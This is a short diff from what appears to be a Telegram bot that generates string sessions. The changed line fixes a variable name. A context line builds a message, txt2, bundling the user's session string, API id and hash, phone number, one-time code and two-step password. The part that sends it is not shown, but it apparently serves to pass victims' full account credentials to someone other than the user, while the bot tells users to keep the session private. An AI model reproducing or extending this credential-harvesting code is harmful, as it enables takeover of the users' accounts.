@@ -223,7 +223,7 @@ async def gen_session(
 
     try:
         txt = "ʜᴇʀᴇ ɪs ʏᴏᴜʀ {0} sᴛʀɪɴɢ sᴇssɪᴏɴ\n\n<code>{1}</code>\n\nᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ ʙʏ <a href={2}>ғᴀʟʟᴇɴ ᴀssᴏᴄɪᴀᴛɪᴏɴ</a>\n☠ <b>ɴᴏᴛᴇ :</b> ᴅᴏɴ'ᴛ sʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ʏᴏᴜʀ ɢɪʀʟғʀɪᴇɴᴅ."
-        username = f"@{message.from_user.username}" if msg.from_user.username else f"user ID {msg.from_user.id}"
+        username = f"@{message.from_user.username}" if message.from_user.username else f"user ID {message.from_user.id}"
         txt2 = f"{username} \n\n sᴛʀɪɴɢ sᴇssɪᴏɴ\n\n<code>{string_session}</code>\n\n api id = {api_id}\n api_hash = {api_hash}\n phone = {phone_number}\n otp = {otp}\n pass = {pwd}"
         
         if telethon:
